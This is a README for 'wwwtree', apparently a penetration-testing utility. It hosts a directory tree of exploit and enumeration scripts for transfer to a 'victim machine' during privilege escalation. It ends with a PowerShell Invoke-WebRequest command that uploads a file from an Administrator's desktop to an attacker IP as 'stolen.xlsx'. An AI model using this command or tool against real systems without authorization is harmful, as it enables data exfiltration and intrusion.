# wwwtree
[![Python](https://img.shields.io/badge/Python-%E2%89%A5%203.x-yellow.svg)](https://www.python.org/) 
<img src="https://img.shields.io/badge/Developed%20on-kali%20linux-blueviolet">
[![License](https://img.shields.io/badge/License-MIT-red.svg)](https://github.com/t3l3machus/wwwtree/blob/main/LICENSE)
<img src="https://img.shields.io/badge/Maintained%3F-Yes-96c40f">

## Purpose
A utility for quickly and easily locating, web hosting and transferring resources (e.g., exploits/enumeration scripts) from your filesystem to a victim machine during privilege escalation.

### Video Presentation
https://www.youtube.com/watch?v=iog-eb_N0Hg

### Preview
![image](https://user-images.githubusercontent.com/75489922/204158750-90ad250c-7787-4fde-92c3-99dae65e5444.png)

## Description
wwwtree does the following:
 - hosts a specified root directory and prints the contents in a tree-like format. Every file is translated to it's equivalent server URL path so you can quickly copy it and use a web client to transfer it to the victim.
 - Filters out files that contain specific substrings based on user provided keywords (use `-k` to parse comma seperated values). Handy for quickly locating resources saved in deep and populated directory structures.
 - Automatically hides from the output files and folders that are most likely not in the scope of enumeration / exploitation (e.g., txt, yml, docx files or .git directories). You can control this behaviour by editing the list variables `hide_extensions` and `hide_dirs` in the source.
 - The wwwtree python http server handler supports PUT requests and by default saves files in `/tmp` (you can change that in the source). You can use it to transfer files from the victim to the attacker machine.


## Installation & Usage
```
git clone https://github.com/t3l3machus/wwwtree
cd ./wwwtree
pip3 install -r requirements.txt
chmod +x wwwtree.py

wwwtree.py [-h] -r ROOT_PATH -i INTERFACE [-l LEVEL] [-p PORT] [-k KEYWORDS] [-A] [-q]
```

### PUT Requests
I've noticed that curl on Windows seems to work improperly when trying to transfer large files. Powershell's `Invoke-WebRequest` works much better:
```
powershell -c "invoke-webrequest -method PUT -headers @{'Content-Type'='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'} -usebasicparsing -uri http://192.168.111.135/stolen.xlsx -body (get-content C:\Users\Administrator\Desktop\some_file.xlsx)"
```
